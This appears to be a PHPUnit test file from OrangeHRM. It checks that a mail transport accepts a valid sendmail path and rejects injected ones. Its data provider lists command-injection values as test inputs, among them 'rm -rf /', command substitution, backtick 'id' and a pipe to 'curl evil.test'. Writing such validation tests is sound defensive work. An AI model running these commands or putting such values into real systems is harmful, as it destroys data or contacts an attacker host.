<?php

/**
 * OrangeHRM is a comprehensive Human Resource Management (HRM) System that captures
 * all the essential functionalities required for any enterprise.
 * Copyright (C) 2006 OrangeHRM Inc., http://www.orangehrm.com
 *
 * OrangeHRM is free software: you can redistribute it and/or modify it under the terms of
 * the GNU General Public License as published by the Free Software Foundation, either
 * version 3 of the License, or (at your option) any later version.
 *
 * OrangeHRM is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with OrangeHRM.
 * If not, see <https://www.gnu.org/licenses/>.
 */

namespace OrangeHRM\Tests\Core\Utility;

use OrangeHRM\Core\Utility\MailTransport;
use OrangeHRM\Tests\Util\TestCase;
use ReflectionClass;
use Symfony\Component\Mailer\Transport\SendmailTransport;

/**
 * @group Core
 * @group Utility
 */
class MailTransportTest extends TestCase
{
    public function testConstructWithValidSendmailPathCreatesSendmailTransport(): void
    {
        $path = '/usr/sbin/sendmail -bs';
        $mailTransport = new MailTransport(MailTransport::SCHEME_SENDMAIL, $path);

        $inner = $this->getInnerTransport($mailTransport);
        $this->assertInstanceOf(SendmailTransport::class, $inner);
        // The configured path must reach the transport verbatim, with no
        // URL-encoding/decoding round-trip mangling it.
        $this->assertSame($path, $this->getCommand($inner));
    }

    /**
     * @dataProvider invalidSendmailPathDataProvider
     */
    public function testConstructWithInvalidSendmailPathThrowsException(string $maliciousPath): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Invalid sendmail path');
        new MailTransport(MailTransport::SCHEME_SENDMAIL, $maliciousPath);
    }

    public function invalidSendmailPathDataProvider(): array
    {
        return [
            'command injection with semicolon' => ['/usr/sbin/sendmail -bs; rm -rf /'],
            'command substitution' => ['/usr/sbin/sendmail -bs $(touch /tmp/x)'],
            'pipe injection' => ['/usr/sbin/sendmail | curl evil.test'],
            'url-encoded injection' => ['/usr/sbin/sendmail%20-bs%3Brm'],
            'not an absolute path' => ['sendmail -bs'],
            'backtick injection' => ['/usr/sbin/sendmail `id`'],
        ];
    }

    private function getInnerTransport(MailTransport $mailTransport): object
    {
        $reflection = new ReflectionClass(MailTransport::class);
        $property = $reflection->getProperty('mailTransport');
        $property->setAccessible(true);
        return $property->getValue($mailTransport);
    }

    private function getCommand(SendmailTransport $transport): string
    {
        $reflection = new ReflectionClass(SendmailTransport::class);
        $property = $reflection->getProperty('command');
        $property->setAccessible(true);
        return $property->getValue($transport);
    }
}
